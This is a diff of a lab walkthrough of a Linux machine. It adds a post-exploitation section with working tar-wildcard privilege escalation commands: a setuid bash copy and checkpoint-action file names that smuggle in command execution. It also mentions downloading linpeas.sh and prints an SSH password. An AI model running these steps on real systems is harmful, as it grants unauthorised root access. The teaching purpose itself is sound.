@@ -101,7 +101,7 @@ Hence privileges need to be escalated.
 
 <img width="727" height="534" alt="image" src="https://github.com/user-attachments/assets/2061ac0f-2139-4552-b770-8588dd73677c" />
 
-From above screenshot, under the context of *www-data*, a download is initiated from the attacker's machine for the script *linpeas.sh*. And then add execution permission.
+From above screenshot, under the context of *www-data*, a download is initiated from the attacker's machine for the script tool LinPEAS - Linux Privilege Escalation Awesome Script (https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). And then add execution permission to this script that is named "*linpeas.sh*".
 This script is to automate enumeration for attack vectors to escalate privilege.
 
 Run the script using command: ```./linpeas.sh``` <br>
@@ -118,8 +118,38 @@ Based on the earlier port scan, there is also a SSH service. This password can b
 
 <img width="602" height="220" alt="image" src="https://github.com/user-attachments/assets/2d336627-c999-479b-b23a-bafd29b27f42" />
 
-As per above screeshot, the attacker is able to access the target machine via SSH using the username: *andre* and password: *UQfsdCB7aAP6*.
+As per above screenshot, the attacker is able to access the target machine via SSH using the username: *andre* and password: *UQfsdCB7aAP6*.
 
+
+## 3. Post-Exploitation
+### 3.1. post-exploitation enumeration
+
+Enumerating scheduled tasks (```cat /etc/crontab```) as per below. <br>
+
+<img width="870" height="279" alt="image" src="https://github.com/user-attachments/assets/f92a1d53-db93-4c7c-bf05-82a4e4280757" />
+
+It is discovered that all content in the directory /home/andre/backup is to be archived by the tar (tape archive) tool.
+And this is scheduled to be run under the context of root user every two minutes.
+However the use of the wildcard * in tar archiving can be exploited.
+
+### 3.2. privilege escalation using cron wildcard
+
+Essentially, the attacker could create a malicious script in the backup folder for tar tool to run during the archival task.
+
+Run the commands: <br>
+``` echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > hello.sh ``` (Ensure to copy the hello.sh to the directory /home/andre/backup) <br>
+``` chmod +x hello.sh ```<br>
+<img width="619" height="34" alt="image" src="https://github.com/user-attachments/assets/16561513-1b1a-492f-b653-5808fd6a02ec" />
+
+``` touch /home/user/--checkpoint=1 ```<br>
+``` touch /home/user/--checkpoint-action=exec=sh\ hello.sh ```<br>
+<img width="694" height="191" alt="image" src="https://github.com/user-attachments/assets/46e5c440-0051-4d14-a2a5-490b040ed773" />
+
+Verify that /tmp/bash is already written by the script when the scheduled task executes <br>
+<img width="449" height="37" alt="image" src="https://github.com/user-attachments/assets/e16a20a7-c160-4d51-87f6-c87ab8236f16" />
+
+Run ```/tmp/bash -p``` to get root shell.<br>
+<img width="384" height="74" alt="image" src="https://github.com/user-attachments/assets/596c0989-b2ab-4a3e-8bad-f05962bfb9cb" />
 
 
 
